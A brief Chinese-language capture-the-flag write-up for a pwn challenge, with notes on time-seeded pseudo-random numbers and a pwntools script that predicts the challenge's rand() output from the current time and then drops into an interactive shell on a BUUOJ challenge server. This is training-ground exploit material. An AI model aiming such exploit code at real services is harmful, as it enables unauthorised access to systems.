1. 在linux系统上，system执行了错误的函数会异常退出，进入shell
2. 时间戳伪随机数，注意打远程时网要好，如果延时随机数变化

exp：

```
from pwn import *
from ctypes import *

context(log_level='debug',arch='amd64',os='linux')
# io = process('/home/kali/Desktop/pwn')
io = remote('node4.buuoj.cn',27485)

elf = ELF('/home/kali/Desktop/pwn')
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

io.recvuntil(b'can you guess the number?')

seed = libc.time(0)
libc.srand(seed)
num = libc.rand()
print(num)

io.sendline(str(num))
io.interactive()
```
